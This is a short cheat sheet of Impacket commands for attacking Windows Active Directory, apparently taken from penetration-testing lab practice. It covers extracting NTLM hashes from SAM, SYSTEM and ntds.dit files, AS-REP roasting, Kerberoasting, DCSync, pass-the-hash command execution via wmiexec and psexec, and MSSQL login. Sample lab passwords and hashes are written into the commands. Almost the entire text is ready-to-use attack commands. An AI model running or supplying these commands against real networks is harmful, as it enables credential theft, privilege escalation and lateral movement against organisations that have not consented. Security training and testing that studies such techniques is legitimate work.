**Change Username, Password, IP, Filename Accordingly** 

Run this in Linux machine where the file SAM and SYSTEM located, to get NTLM hashes.
```
impacket-secretsdump -sam SAM -system SYSTEM local
```

Run this to perform AS-REP roasting, required Username and Password of an user in the domain.
```
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Run this to Perform Kerberoasting to get TGS Req hash (SPN), Need Username and Password.
```
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

Domain Controller Synchronization.
```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70 
```

Port 445 has to be opened in the target, we have to use NTLM hash of the Administrator in this case.
```
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

Extract the NTLM hashes from the ntds and SYSTEM file.
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

Login to any Machine with smb service open, Need Domain Admin Credentials.
```
impacket-psexec -dc-ip 172.168.170.10 leon@172.16.170.13
```
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Login into MSSQL.
```
impacket-mssqlclient -windows-auth sql_svc:Dolphin1@10.10.179.148
```
```
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.76.222 -windows-auth
```

